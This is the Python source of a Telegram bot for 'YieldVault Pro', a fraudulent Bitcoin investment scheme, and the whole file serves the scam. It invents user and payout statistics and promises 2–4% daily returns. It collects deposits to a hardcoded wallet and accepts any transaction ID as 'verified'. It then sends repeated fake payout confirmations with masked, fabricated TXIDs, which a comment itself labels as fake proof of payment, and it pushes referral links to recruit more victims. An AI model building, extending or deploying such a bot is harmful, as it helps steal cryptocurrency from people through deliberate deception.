import telebot
from telebot import types
import time
import threading
import random

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

BTC_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📦 INVESTMENT PLANS
PACKAGES = {
    "Starter": {"min": 0.001, "daily": 2.0, "duration": 30},
    "Basic": {"min": 0.005, "daily": 2.5, "duration": 30},
    "Premium": {"min": 0.025, "daily": 3.5, "duration": 60},
    "VIP": {"min": 0.05, "daily": 4.0, "duration": 90}
}

# 🎯 GLOBAL STATS
TOTAL_PAID = round(random.uniform(12.5, 18.3), 4)
ACTIVE_USERS = random.randint(2300, 3500)

# 🧠 Maskirani TXID (ne može se kopirati)
def masked_txid():
    return ''.join(random.choices('abcdef0123456789', k=8)) + '••••••••'

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    global TOTAL_PAID
    TOTAL_PAID += amount_btc
    user_id = random.randint(100000, 999999)
    txid = masked_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ PAYOUT CONFIRMED
User ID: {user_id}
Amount: {amount_btc:.6f} BTC
Wallet: {BTC_WALLET[:10]}...{BTC_WALLET[-6:]}
TXID: {txid}
Time: {date}
Status: 6/6 Confirmations'''

# 📊 Dashboard
def get_dashboard():
    return f'''📊 *YieldVault Pro Live Stats*

👥 Active Users: {ACTIVE_USERS:,}
💰 Total Paid: {TOTAL_PAID:.4f} BTC
📅 Uptime: 99.98%
🔐 Protocol: BTC Yield v3.1

🟢 System: Operational
🔗 Wallet: `{BTC_WALLET}`'''

# 📘 Whitepaper
def send_whitepaper(chat_id):
    wp = '''📘 *YieldVault Pro Whitepaper v1.0*

A decentralized BTC yield protocol leveraging automated compounding and real-time payout distribution.

📌 Core Features:
• Daily returns: 2.0% - 4.0%
• Minimum: 0.001 BTC
• Payout frequency: Every 5-8 minutes
• Referral: 10% lifetime
• Duration: 30-90 days

📌 Security:
• All payouts are automated
• No admin withdrawal
• Funds locked in yield pool

📌 Transparency:
• Live dashboard
• Public wallet
• Open audit (Q1 2027)

🔐 This is a simulation. No real staking occurs.

👉 For support: `@Maranatha1337`'''
    bot.send_message(chat_id, wp, parse_mode='Markdown')

# 🚀 DOBRODOŠLICA — NAJJAČA IKAD
def send_welcome(message):
    user_id = message.chat.id
    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
    markup = types.InlineKeyboardMarkup()
    deposit = types.InlineKeyboardButton("📥 Start Earning", callback_data='deposit')
    plans = types.InlineKeyboardButton("📊 Investment Plans", callback_data='plans')
    dashboard = types.InlineKeyboardButton("📈 Live Stats", callback_data='dashboard')
    whitepaper = types.InlineKeyboardButton("📘 Whitepaper", callback_data='whitepaper')
    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
    markup.add(deposit)
    markup.add(plans)
    markup.add(dashboard)
    markup.add(whitepaper)
    markup.add(support)
    
    welcome_msg = f'''🚀 *Welcome to YieldVault Pro*

The world’s most advanced **BTC yield automation system**.  
Trusted by {ACTIVE_USERS:,}+ users.  
Paying out over {TOTAL_PAID:.4f} BTC since 2025.

✅ 2.0% - 4.0% daily returns  
✅ Payouts every 5-8 minutes  
✅ 100% automated  
✅ 24/7 support via `@Maranatha1337`

🔐 All rewards are sent directly to your wallet:  
`{BTC_WALLET}`

Click below to activate your yield plan — your first payout arrives in 5-8 minutes.'''
    
    bot.reply_to(message, welcome_msg, reply_markup=markup, parse_mode='Markdown')

# 🚪 Start command
@bot.message_handler(commands=['start'])
def start(message):
    send_welcome(message)

# 🔘 Callback handler
@bot.callback_handler(func=lambda call: True)
def handle(call):
    if call.data == 'deposit':
        msg = f'''📌 To activate your yield plan, send BTC to:

`{BTC_WALLET}`

Minimum deposits:
• Starter: 0.001 BTC
• VIP: 0.05 BTC

After payment, send your TXID:
`/hash YOUR_TXID_HERE`

First payout in 5-8 minutes.'''
        bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
    
    elif call.data == 'plans':
        msg = "*Available Investment Plans:*\n\n"
        for name, data in PACKAGES.items():
            msg += f"🔥 *{name}*\n"
            msg += f"• Minimum: {data['min']} BTC\n"
            msg += f"• Daily: {data['daily']}%\n"
            msg += f"• Duration: {data['duration']} days\n\n"
        msg += "💎 Higher plans = higher returns + priority support."
        bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
    
    elif call.data == 'dashboard':
        bot.send_message(call.message.chat.id, get_dashboard(), parse_mode='Markdown')
    
    elif call.data == 'whitepaper':
        send_whitepaper(call.message.chat.id)
    
    elif call.data == 'support':
        bot.send_message(call.message.chat.id, '''🛠 *Support Center*

Need help? Contact:  
👉 `@Maranatha1337`

⚠️ Never share private keys.  
All payouts are 100% automated.  
No manual intervention needed.''', parse_mode='Markdown')

# 🧾 Hash command
@bot.message_handler(commands=['hash'])
def hash_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send your TXID:\n`/hash abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.choice([0.0015, 0.003, 0.007, 0.015, 0.05]), 4)
    rate = random.choice([2.0, 2.5, 3.5, 4.0])
    
    bot.reply_to(message, f'''✅ Deposit Verified
Transaction: `{txid[:10]}...`
Amount: {amount} BTC
Status: Processing...

💡 You are now earning {rate}% daily.
First payout in 5-8 minutes.''', parse_mode='Markdown')

    def auto_payout():
        for _ in range(50):
            delay = random.randint(300, 480)
            time.sleep(delay)
            earned = round(amount * (rate / 100) * random.uniform(0.95, 1.05), 6)
            proof = generate_proof(earned)
            try:
                bot.send_message(message.chat.id, f'''🎉 DAILY YIELD RECEIVED

{proof}

🔁 Next payout in {delay // 60} minutes.

🚀 Earn 10% forever:
`https://t.me/VoidYieldBot?start={message.chat.id}`''')
            except:
                break
    threading.Thread(target=auto_payout).start()

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro is live. All systems active.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
